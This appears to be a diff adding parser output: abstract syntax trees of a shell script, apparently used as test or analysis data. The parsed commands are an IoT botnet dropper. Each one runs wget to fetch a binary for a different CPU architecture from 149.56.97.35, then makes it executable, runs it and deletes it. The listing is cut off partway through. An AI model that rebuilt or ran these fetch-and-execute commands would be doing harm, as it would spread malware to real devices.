@@ -1,0 +1,611 @@
+ListNode(lineno=2, pos=(12, 147), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 37), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 37), word='/var/system'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(38, 40)),
+  CommandNode(lineno=2, pos=(41, 48), parts=[
+    WordNode(lineno=2, pos=(41, 43), word='cd'),
+    WordNode(lineno=2, pos=(44, 48), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(49, 51)),
+  CommandNode(lineno=2, pos=(52, 60), parts=[
+    WordNode(lineno=2, pos=(52, 54), word='cd'),
+    WordNode(lineno=2, pos=(55, 60), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(61, 63)),
+  CommandNode(lineno=2, pos=(64, 68), parts=[
+    WordNode(lineno=2, pos=(64, 66), word='cd'),
+    WordNode(lineno=2, pos=(67, 68), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(68, 69)),
+  CommandNode(lineno=2, pos=(70, 102), parts=[
+    WordNode(lineno=2, pos=(70, 74), word='wget'),
+    WordNode(lineno=2, pos=(75, 102), word='http://149.56.97.35/IoTmips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(102, 103)),
+  CommandNode(lineno=2, pos=(104, 120), parts=[
+    WordNode(lineno=2, pos=(104, 109), word='chmod'),
+    WordNode(lineno=2, pos=(110, 112), word='+x'),
+    WordNode(lineno=2, pos=(113, 120), word='IoTmips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(120, 121)),
+  CommandNode(lineno=2, pos=(122, 131), parts=[
+    WordNode(lineno=2, pos=(122, 131), word='./IoTmips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(131, 132)),
+  CommandNode(lineno=2, pos=(133, 147), parts=[
+    WordNode(lineno=2, pos=(133, 135), word='rm'),
+    WordNode(lineno=2, pos=(136, 139), word='-rf'),
+    WordNode(lineno=2, pos=(140, 147), word='IoTmips'),
+  ]),
+])
+ListNode(lineno=3, pos=(148, 291), parts=[
+  CommandNode(lineno=3, pos=(148, 155), parts=[
+    WordNode(lineno=3, pos=(148, 150), word='cd'),
+    WordNode(lineno=3, pos=(151, 155), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(156, 158)),
+  CommandNode(lineno=3, pos=(159, 173), parts=[
+    WordNode(lineno=3, pos=(159, 161), word='cd'),
+    WordNode(lineno=3, pos=(162, 173), word='/var/system'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(174, 176)),
+  CommandNode(lineno=3, pos=(177, 184), parts=[
+    WordNode(lineno=3, pos=(177, 179), word='cd'),
+    WordNode(lineno=3, pos=(180, 184), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(185, 187)),
+  CommandNode(lineno=3, pos=(188, 196), parts=[
+    WordNode(lineno=3, pos=(188, 190), word='cd'),
+    WordNode(lineno=3, pos=(191, 196), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(197, 199)),
+  CommandNode(lineno=3, pos=(200, 204), parts=[
+    WordNode(lineno=3, pos=(200, 202), word='cd'),
+    WordNode(lineno=3, pos=(203, 204), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(204, 205)),
+  CommandNode(lineno=3, pos=(206, 240), parts=[
+    WordNode(lineno=3, pos=(206, 210), word='wget'),
+    WordNode(lineno=3, pos=(211, 240), word='http://149.56.97.35/IoTmips64'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(240, 241)),
+  CommandNode(lineno=3, pos=(242, 260), parts=[
+    WordNode(lineno=3, pos=(242, 247), word='chmod'),
+    WordNode(lineno=3, pos=(248, 250), word='+x'),
+    WordNode(lineno=3, pos=(251, 260), word='IoTmips64'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(260, 261)),
+  CommandNode(lineno=3, pos=(262, 273), parts=[
+    WordNode(lineno=3, pos=(262, 273), word='./IoTmips64'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(273, 274)),
+  CommandNode(lineno=3, pos=(275, 291), parts=[
+    WordNode(lineno=3, pos=(275, 277), word='rm'),
+    WordNode(lineno=3, pos=(278, 281), word='-rf'),
+    WordNode(lineno=3, pos=(282, 291), word='IoTmips64'),
+  ]),
+])
+ListNode(lineno=4, pos=(292, 435), parts=[
+  CommandNode(lineno=4, pos=(292, 299), parts=[
+    WordNode(lineno=4, pos=(292, 294), word='cd'),
+    WordNode(lineno=4, pos=(295, 299), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(300, 302)),
+  CommandNode(lineno=4, pos=(303, 317), parts=[
+    WordNode(lineno=4, pos=(303, 305), word='cd'),
+    WordNode(lineno=4, pos=(306, 317), word='/var/system'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(318, 320)),
+  CommandNode(lineno=4, pos=(321, 328), parts=[
+    WordNode(lineno=4, pos=(321, 323), word='cd'),
+    WordNode(lineno=4, pos=(324, 328), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(329, 331)),
+  CommandNode(lineno=4, pos=(332, 340), parts=[
+    WordNode(lineno=4, pos=(332, 334), word='cd'),
+    WordNode(lineno=4, pos=(335, 340), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(341, 343)),
+  CommandNode(lineno=4, pos=(344, 348), parts=[
+    WordNode(lineno=4, pos=(344, 346), word='cd'),
+    WordNode(lineno=4, pos=(347, 348), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(348, 349)),
+  CommandNode(lineno=4, pos=(350, 384), parts=[
+    WordNode(lineno=4, pos=(350, 354), word='wget'),
+    WordNode(lineno=4, pos=(355, 384), word='http://149.56.97.35/IoTmipsel'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(384, 385)),
+  CommandNode(lineno=4, pos=(386, 404), parts=[
+    WordNode(lineno=4, pos=(386, 391), word='chmod'),
+    WordNode(lineno=4, pos=(392, 394), word='+x'),
+    WordNode(lineno=4, pos=(395, 404), word='IoTmipsel'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(404, 405)),
+  CommandNode(lineno=4, pos=(406, 417), parts=[
+    WordNode(lineno=4, pos=(406, 417), word='./IoTmipsel'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(417, 418)),
+  CommandNode(lineno=4, pos=(419, 435), parts=[
+    WordNode(lineno=4, pos=(419, 421), word='rm'),
+    WordNode(lineno=4, pos=(422, 425), word='-rf'),
+    WordNode(lineno=4, pos=(426, 435), word='IoTmipsel'),
+  ]),
+])
+ListNode(lineno=5, pos=(436, 567), parts=[
+  CommandNode(lineno=5, pos=(436, 443), parts=[
+    WordNode(lineno=5, pos=(436, 438), word='cd'),
+    WordNode(lineno=5, pos=(439, 443), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(444, 446)),
+  CommandNode(lineno=5, pos=(447, 461), parts=[
+    WordNode(lineno=5, pos=(447, 449), word='cd'),
+    WordNode(lineno=5, pos=(450, 461), word='/var/system'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(462, 464)),
+  CommandNode(lineno=5, pos=(465, 472), parts=[
+    WordNode(lineno=5, pos=(465, 467), word='cd'),
+    WordNode(lineno=5, pos=(468, 472), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(473, 475)),
+  CommandNode(lineno=5, pos=(476, 484), parts=[
+    WordNode(lineno=5, pos=(476, 478), word='cd'),
+    WordNode(lineno=5, pos=(479, 484), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(485, 487)),
+  CommandNode(lineno=5, pos=(488, 492), parts=[
+    WordNode(lineno=5, pos=(488, 490), word='cd'),
+    WordNode(lineno=5, pos=(491, 492), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(492, 493)),
+  CommandNode(lineno=5, pos=(494, 525), parts=[
+    WordNode(lineno=5, pos=(494, 498), word='wget'),
+    WordNode(lineno=5, pos=(499, 525), word='http://149.56.97.35/IoTsh4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(525, 526)),
+  CommandNode(lineno=5, pos=(527, 542), parts=[
+    WordNode(lineno=5, pos=(527, 532), word='chmod'),
+    WordNode(lineno=5, pos=(533, 535), word='+x'),
+    WordNode(lineno=5, pos=(536, 542), word='IoTsh4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(542, 543)),
+  CommandNode(lineno=5, pos=(544, 552), parts=[
+    WordNode(lineno=5, pos=(544, 552), word='./IoTsh4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(552, 553)),
+  CommandNode(lineno=5, pos=(554, 567), parts=[
+    WordNode(lineno=5, pos=(554, 556), word='rm'),
+    WordNode(lineno=5, pos=(557, 560), word='-rf'),
+    WordNode(lineno=5, pos=(561, 567), word='IoTsh4'),
+  ]),
+])
+ListNode(lineno=6, pos=(568, 699), parts=[
+  CommandNode(lineno=6, pos=(568, 575), parts=[
+    WordNode(lineno=6, pos=(568, 570), word='cd'),
+    WordNode(lineno=6, pos=(571, 575), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(576, 578)),
+  CommandNode(lineno=6, pos=(579, 593), parts=[
+    WordNode(lineno=6, pos=(579, 581), word='cd'),
+    WordNode(lineno=6, pos=(582, 593), word='/var/system'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(594, 596)),
+  CommandNode(lineno=6, pos=(597, 604), parts=[
+    WordNode(lineno=6, pos=(597, 599), word='cd'),
+    WordNode(lineno=6, pos=(600, 604), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(605, 607)),
+  CommandNode(lineno=6, pos=(608, 616), parts=[
+    WordNode(lineno=6, pos=(608, 610), word='cd'),
+    WordNode(lineno=6, pos=(611, 616), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(617, 619)),
+  CommandNode(lineno=6, pos=(620, 624), parts=[
+    WordNode(lineno=6, pos=(620, 622), word='cd'),
+    WordNode(lineno=6, pos=(623, 624), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(624, 625)),
+  CommandNode(lineno=6, pos=(626, 657), parts=[
+    WordNode(lineno=6, pos=(626, 630), word='wget'),
+    WordNode(lineno=6, pos=(631, 657), word='http://149.56.97.35/IoTx86'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(657, 658)),
+  CommandNode(lineno=6, pos=(659, 674), parts=[
+    WordNode(lineno=6, pos=(659, 664), word='chmod'),
+    WordNode(lineno=6, pos=(665, 667), word='+x'),
+    WordNode(lineno=6, pos=(668, 674), word='IoTx86'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(674, 675)),
+  CommandNode(lineno=6, pos=(676, 684), parts=[
+    WordNode(lineno=6, pos=(676, 684), word='./IoTx86'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(684, 685)),
+  CommandNode(lineno=6, pos=(686, 699), parts=[
+    WordNode(lineno=6, pos=(686, 688), word='rm'),
+    WordNode(lineno=6, pos=(689, 692), word='-rf'),
+    WordNode(lineno=6, pos=(693, 699), word='IoTx86'),
+  ]),
+])
+ListNode(lineno=7, pos=(700, 835), parts=[
+  CommandNode(lineno=7, pos=(700, 707), parts=[
+    WordNode(lineno=7, pos=(700, 702), word='cd'),
+    WordNode(lineno=7, pos=(703, 707), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(708, 710)),
+  CommandNode(lineno=7, pos=(711, 725), parts=[
+    WordNode(lineno=7, pos=(711, 713), word='cd'),
+    WordNode(lineno=7, pos=(714, 725), word='/var/system'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(726, 728)),
+  CommandNode(lineno=7, pos=(729, 736), parts=[
+    WordNode(lineno=7, pos=(729, 731), word='cd'),
+    WordNode(lineno=7, pos=(732, 736), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(737, 739)),
+  CommandNode(lineno=7, pos=(740, 748), parts=[
+    WordNode(lineno=7, pos=(740, 742), word='cd'),
+    WordNode(lineno=7, pos=(743, 748), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(749, 751)),
+  CommandNode(lineno=7, pos=(752, 756), parts=[
+    WordNode(lineno=7, pos=(752, 754), word='cd'),
+    WordNode(lineno=7, pos=(755, 756), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(756, 757)),
+  CommandNode(lineno=7, pos=(758, 790), parts=[
+    WordNode(lineno=7, pos=(758, 762), word='wget'),
+    WordNode(lineno=7, pos=(763, 790), word='http://149.56.97.35/IoTi686'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(790, 791)),
+  CommandNode(lineno=7, pos=(792, 808), parts=[
+    WordNode(lineno=7, pos=(792, 797), word='chmod'),
+    WordNode(lineno=7, pos=(798, 800), word='+x'),
+    WordNode(lineno=7, pos=(801, 808), word='IoTi686'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(808, 809)),
+  CommandNode(lineno=7, pos=(810, 819), parts=[
+    WordNode(lineno=7, pos=(810, 819), word='./IoTi686'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(819, 820)),
+  CommandNode(lineno=7, pos=(821, 835), parts=[
+    WordNode(lineno=7, pos=(821, 823), word='rm'),
+    WordNode(lineno=7, pos=(824, 827), word='-rf'),
+    WordNode(lineno=7, pos=(828, 835), word='IoTi686'),
+  ]),
+])
+ListNode(lineno=8, pos=(836, 983), parts=[
+  CommandNode(lineno=8, pos=(836, 843), parts=[
+    WordNode(lineno=8, pos=(836, 838), word='cd'),
+    WordNode(lineno=8, pos=(839, 843), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(844, 846)),
+  CommandNode(lineno=8, pos=(847, 861), parts=[
+    WordNode(lineno=8, pos=(847, 849), word='cd'),
+    WordNode(lineno=8, pos=(850, 861), word='/var/system'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(862, 864)),
+  CommandNode(lineno=8, pos=(865, 872), parts=[
+    WordNode(lineno=8, pos=(865, 867), word='cd'),
+    WordNode(lineno=8, pos=(868, 872), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(873, 875)),
+  CommandNode(lineno=8, pos=(876, 884), parts=[
+    WordNode(lineno=8, pos=(876, 878), word='cd'),
+    WordNode(lineno=8, pos=(879, 884), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(885, 887)),
+  CommandNode(lineno=8, pos=(888, 892), parts=[
+    WordNode(lineno=8, pos=(888, 890), word='cd'),
+    WordNode(lineno=8, pos=(891, 892), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(892, 893)),
+  CommandNode(lineno=8, pos=(894, 929), parts=[
+    WordNode(lineno=8, pos=(894, 898), word='wget'),
+    WordNode(lineno=8, pos=(899, 929), word='http://149.56.97.35/IoTpowerpc'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(929, 930)),
+  CommandNode(lineno=8, pos=(931, 950), parts=[
+    WordNode(lineno=8, pos=(931, 936), word='chmod'),
+    WordNode(lineno=8, pos=(937, 939), word='+x'),
+    WordNode(lineno=8, pos=(940, 950), word='IoTpowerpc'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(950, 951)),
+  CommandNode(lineno=8, pos=(952, 964), parts=[
+    WordNode(lineno=8, pos=(952, 964), word='./IoTpowerpc'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(964, 965)),
+  CommandNode(lineno=8, pos=(966, 983), parts=[
+    WordNode(lineno=8, pos=(966, 968), word='rm'),
+    WordNode(lineno=8, pos=(969, 972), word='-rf'),
+    WordNode(lineno=8, pos=(973, 983), word='IoTpowerpc'),
+  ]),
+])
+ListNode(lineno=9, pos=(984, 1119), parts=[
+  CommandNode(lineno=9, pos=(984, 991), parts=[
+    WordNode(lineno=9, pos=(984, 986), word='cd'),
+    WordNode(lineno=9, pos=(987, 991), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(992, 994)),
+  CommandNode(lineno=9, pos=(995, 1009), parts=[
+    WordNode(lineno=9, pos=(995, 997), word='cd'),
+    WordNode(lineno=9, pos=(998, 1009), word='/var/system'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1010, 1012)),
+  CommandNode(lineno=9, pos=(1013, 1020), parts=[
+    WordNode(lineno=9, pos=(1013, 1015), word='cd'),
+    WordNode(lineno=9, pos=(1016, 1020), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1021, 1023)),
+  CommandNode(lineno=9, pos=(1024, 1032), parts=[
+    WordNode(lineno=9, pos=(1024, 1026), word='cd'),
+    WordNode(lineno=9, pos=(1027, 1032), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1033, 1035)),
+  CommandNode(lineno=9, pos=(1036, 1040), parts=[
+    WordNode(lineno=9, pos=(1036, 1038), word='cd'),
+    WordNode(lineno=9, pos=(1039, 1040), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1040, 1041)),
+  CommandNode(lineno=9, pos=(1042, 1074), parts=[
+    WordNode(lineno=9, pos=(1042, 1046), word='wget'),
+    WordNode(lineno=9, pos=(1047, 1074), word='http://149.56.97.35/IoTm86k'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1074, 1075)),
+  CommandNode(lineno=9, pos=(1076, 1092), parts=[
+    WordNode(lineno=9, pos=(1076, 1081), word='chmod'),
+    WordNode(lineno=9, pos=(1082, 1084), word='+x'),
+    WordNode(lineno=9, pos=(1085, 1092), word='IoTm86k'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1092, 1093)),
+  CommandNode(lineno=9, pos=(1094, 1103), parts=[
+    WordNode(lineno=9, pos=(1094, 1103), word='./IoTm86k'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1103, 1104)),
+  CommandNode(lineno=9, pos=(1105, 1119), parts=[
+    WordNode(lineno=9, pos=(1105, 1107), word='rm'),
+    WordNode(lineno=9, pos=(1108, 1111), word='-rf'),
+    WordNode(lineno=9, pos=(1112, 1119), word='IoTm86k'),
+  ]),
+])
+ListNode(lineno=10, pos=(1120, 1259), parts=[
+  CommandNode(lineno=10, pos=(1120, 1127), parts=[
+    WordNode(lineno=10, pos=(1120, 1122), word='cd'),
+    WordNode(lineno=10, pos=(1123, 1127), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1128, 1130)),
+  CommandNode(lineno=10, pos=(1131, 1145), parts=[
+    WordNode(lineno=10, pos=(1131, 1133), word='cd'),
+    WordNode(lineno=10, pos=(1134, 1145), word='/var/system'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1146, 1148)),
+  CommandNode(lineno=10, pos=(1149, 1156), parts=[
+    WordNode(lineno=10, pos=(1149, 1151), word='cd'),
+    WordNode(lineno=10, pos=(1152, 1156), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1157, 1159)),
+  CommandNode(lineno=10, pos=(1160, 1168), parts=[
+    WordNode(lineno=10, pos=(1160, 1162), word='cd'),
+    WordNode(lineno=10, pos=(1163, 1168), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1169, 1171)),
+  CommandNode(lineno=10, pos=(1172, 1176), parts=[
+    WordNode(lineno=10, pos=(1172, 1174), word='cd'),
+    WordNode(lineno=10, pos=(1175, 1176), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1176, 1177)),
+  CommandNode(lineno=10, pos=(1178, 1211), parts=[
+    WordNode(lineno=10, pos=(1178, 1182), word='wget'),
+    WordNode(lineno=10, pos=(1183, 1211), word='http://149.56.97.35/IoTsparc'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1211, 1212)),
+  CommandNode(lineno=10, pos=(1213, 1230), parts=[
+    WordNode(lineno=10, pos=(1213, 1218), word='chmod'),
+    WordNode(lineno=10, pos=(1219, 1221), word='+x'),
+    WordNode(lineno=10, pos=(1222, 1230), word='IoTsparc'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1230, 1231)),
+  CommandNode(lineno=10, pos=(1232, 1242), parts=[
+    WordNode(lineno=10, pos=(1232, 1242), word='./IoTsparc'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1242, 1243)),
+  CommandNode(lineno=10, pos=(1244, 1259), parts=[
+    WordNode(lineno=10, pos=(1244, 1246), word='rm'),
+    WordNode(lineno=10, pos=(1247, 1250), word='-rf'),
+    WordNode(lineno=10, pos=(1251, 1259), word='IoTsparc'),
+  ]),
+])
+ListNode(lineno=11, pos=(1260, 1399), parts=[
+  CommandNode(lineno=11, pos=(1260, 1267), parts=[
+    WordNode(lineno=11, pos=(1260, 1262), word='cd'),
+    WordNode(lineno=11, pos=(1263, 1267), word='/tmp'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1268, 1270)),
+  CommandNode(lineno=11, pos=(1271, 1285), parts=[
+    WordNode(lineno=11, pos=(1271, 1273), word='cd'),
+    WordNode(lineno=11, pos=(1274, 1285), word='/var/system'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1286, 1288)),
+  CommandNode(lineno=11, pos=(1289, 1296), parts=[
+    WordNode(lineno=11, pos=(1289, 1291), word='cd'),
+    WordNode(lineno=11, pos=(1292, 1296), word='/mnt'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1297, 1299)),
+  CommandNode(lineno=11, pos=(1300, 1308), parts=[
+    WordNode(lineno=11, pos=(1300, 1302), word='cd'),
+    WordNode(lineno=11, pos=(1303, 1308), word='/root'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1309, 1311)),
+  CommandNode(lineno=11, pos=(1312, 1316), parts=[
+    WordNode(lineno=11, pos=(1312, 1314), word='cd'),
+    WordNode(lineno=11, pos=(1315, 1316), word='/'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1316, 1317)),
+  CommandNode(lineno=11, pos=(1318, 1351), parts=[
+    WordNode(lineno=11, pos=(1318, 1322), word='wget'),
+    WordNode(lineno=11, pos=(1323, 1351), word='http://149.56.97.35/IoTarmv4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1351, 1352)),
+  CommandNode(lineno=11, pos=(1353, 1370), parts=[
+    WordNode(lineno=11, pos=(1353, 1358), word='chmod'),
+    WordNode(lineno=11, pos=(1359, 1361), word='+x'),
+    WordNode(lineno=11, pos=(1362, 1370), word='IoTarmv4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1370, 1371)),
+  CommandNode(lineno=11, pos=(1372, 1382), parts=[
+    WordNode(lineno=11, pos=(1372, 1382), word='./IoTarmv4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1382, 1383)),
+  CommandNode(lineno=11, pos=(1384, 1399), parts=[
+    WordNode(lineno=11, pos=(1384, 1386), word='rm'),
+    WordNode(lineno=11, pos=(1387, 1390), word='-rf'),
+    WordNode(lineno=11, pos=(1391, 1399), word='IoTarmv4'),
+  ]),
+])
+ListNode(lineno=12, pos=(1400, 1539), parts=[
+  CommandNode(lineno=12, pos=(1400, 1407), parts=[
+    WordNode(lineno=12, pos=(1400, 1402), word='cd'),
+    WordNode(lineno=12, pos=(1403, 1407), word='/tmp'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1408, 1410)),
+  CommandNode(lineno=12, pos=(1411, 1425), parts=[
+    WordNode(lineno=12, pos=(1411, 1413), word='cd'),
+    WordNode(lineno=12, pos=(1414, 1425), word='/var/system'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1426, 1428)),
+  CommandNode(lineno=12, pos=(1429, 1436), parts=[
+    WordNode(lineno=12, pos=(1429, 1431), word='cd'),
+    WordNode(lineno=12, pos=(1432, 1436), word='/mnt'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1437, 1439)),
+  CommandNode(lineno=12, pos=(1440, 1448), parts=[
+    WordNode(lineno=12, pos=(1440, 1442), word='cd'),
+    WordNode(lineno=12, pos=(1443, 1448), word='/root'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1449, 1451)),
+  CommandNode(lineno=12, pos=(1452, 1456), parts=[
+    WordNode(lineno=12, pos=(1452, 1454), word='cd'),
+    WordNode(lineno=12, pos=(1455, 1456), word='/'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1456, 1457)),
+  CommandNode(lineno=12, pos=(1458, 1491), parts=[
+    WordNode(lineno=12, pos=(1458, 1462), word='wget'),
+    WordNode(lineno=12, pos=(1463, 1491), word='http://149.56.97.35/IoTarmv5'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1491, 1492)),
+  CommandNode(lineno=12, pos=(1493, 1510), parts=[
+    WordNode(lineno=12, pos=(1493, 1498), word='chmod'),
+    WordNode(lineno=12, pos=(1499, 1501), word='+x'),
+    WordNode(lineno=12, pos=(1502, 1510), word='IoTarmv5'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1510, 1511)),
+  CommandNode(lineno=12, pos=(1512, 1522), parts=[
+    WordNode(lineno=12, pos=(1512, 1522), word='./IoTarmv5'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1522, 1523)),
+  CommandNode(lineno=12, pos=(1524, 1539), parts=[
+    WordNode(lineno=12, pos=(1524, 1526), word='rm'),
+    WordNode(lineno=12, pos=(1527, 1530), word='-rf'),
+    WordNode(lineno=12, pos=(1531, 1539), word='IoTarmv5'),
+  ]),
+])
+ListNode(lineno=13, pos=(1540, 1679), parts=[
+  CommandNode(lineno=13, pos=(1540, 1547), parts=[
+    WordNode(lineno=13, pos=(1540, 1542), word='cd'),
+    WordNode(lineno=13, pos=(1543, 1547), word='/tmp'),
+  ]),
+  OperatorNode(lineno=13, op='||', pos=(1548, 1550)),
+  CommandNode(lineno=13, pos=(1551, 1565), parts=[
+    WordNode(lineno=13, pos=(1551, 1553), word='cd'),
+    WordNode(lineno=13, pos=(1554, 1565), word='/var/system'),
+  ]),
+  OperatorNode(lineno=13, op='||', pos=(1566, 1568)),
+  CommandNode(lineno=13, pos=(1569, 1576), parts=[
+    WordNode(lineno=13, pos=(1569, 1571), word='cd'),
+    WordNode(lineno=13, pos=(1572, 1576), word='/mnt'),
+  ]),
+  OperatorNode(lineno=13, op='||', pos=(1577, 1579)),
+  CommandNode(lineno=13, pos=(1580, 1588), parts=[
+    WordNode(lineno=13, pos=(1580, 1582), word='cd'),
+    WordNode(lineno=13, pos=(1583, 1588), word='/root'),
+  ]),
+  OperatorNode(lineno=13, op='||', pos=(1589, 1591)),
+  CommandNode(lineno=13, pos=(1592, 1596), parts=[
+    WordNode(lineno=13, pos=(1592, 1594), word='cd'),
+    WordNode(lineno=13, pos=(1595, 1596), word='/'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(1596, 1597)),
+  CommandNode(lineno=13, pos=(1598, 1631), parts=[
+    WordNode(lineno=13, pos=(1598, 1602), word='wget'),
+    WordNode(lineno=13, pos=(1603, 1631), word='http://149.56.97.35/IoTarmv6'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(1631, 1632)),
+  CommandNode(lineno=13, pos=(1633, 1650), parts=[
+    WordNode(lineno=13, pos=(1633, 1638), word='chmod'),
+    WordNode(lineno=13, pos=(1639, 1641), word='+x'),
+    WordNode(lineno=13, pos=(1642, 1650), word='IoTarmv6'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(1650, 1651)),
+  CommandNode(lineno=13, pos=(1652, 1662), parts=[
+    WordNode(lineno=13, pos=(1652, 1662), word='./IoTarmv6'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(1662, 1663)),
+  CommandNode(lineno=13, pos=(1664, 1679), parts=[
+    WordNode(lineno=13, pos=(1664, 1666), word='rm'),
+    WordNode(lineno=13, pos=(1667, 1670), word='-rf'),
+    WordNode(lineno=13, pos=(1671, 1679), word='IoTarmv6'),
+  ]),
+])
+ListNode(lineno=14, pos=(1680, 1819), parts=[
+  CommandNode(lineno=14, pos=(1680, 1687), parts=[
+    WordNode(lineno=14, pos=(1680, 1682), word='cd'),
+    WordNode(lineno=14, pos=(1683, 1687), word='/tmp'),
+  ]),
+  OperatorNode(lineno=14, op='||', pos=(1688, 1690)),
+  CommandNode(lineno=14, pos=(1691, 1705), parts=[
+    WordNode(lineno=14, pos=(1691, 1693), word='cd'),
+    WordNode(lineno=14, pos=(1694, 1705), word='/var/system'),
+  ]),
+  OperatorNode(lineno=14, op='||', pos=(1706, 1708)),
+  CommandNode(lineno=14, pos=(1709, 1716), parts=[
+    WordNode(lineno=14, pos=(1709, 1711), word='cd'),
+    WordNode(lineno=14, pos=(1712, 1716), word='/mnt'),
+  ]),
+  OperatorNode(lineno=14, op='||', pos=(1717, 1719)),
+  CommandNode(lineno=14, pos=(1720, 1728), parts=[
+    WordNode(lineno=14, pos=(1720, 1722), word='cd'),
+    WordNode(lineno=14, pos=(1723, 1728), word='/root'),
+  ]),
+  OperatorNode(lineno=14, op='||', pos=(1729, 1731)),
+  CommandNode(lineno=14, pos=(1732, 1736), parts=[
+    WordNode(lineno=14, pos=(1732, 1734), word='cd'),
+    WordNode(lineno=14, pos=(1735, 1736), word='/'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(1736, 1737)),
